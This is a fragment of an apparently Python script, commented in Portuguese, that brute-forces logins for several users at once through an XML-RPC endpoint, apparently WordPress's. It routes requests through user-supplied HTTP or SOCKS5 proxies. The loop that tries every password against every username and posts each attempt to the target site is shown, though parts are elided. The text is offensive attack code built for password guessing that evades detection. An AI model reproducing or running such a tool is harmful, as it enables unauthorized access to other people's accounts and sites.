# BRUTEFORCE EM MAIS DE UM USUARIO VIA XMLRPC COM PROXIES !
...
proxy = str(input("Digite seu proxy(somente https,http ou socks5): ").strip())
...
for senha in senhas_lista:
	 for usuario in usuarios_lista:
	 	 ...
	 	 r = xml.post(url=site,data=postdata,proxies=proxies)
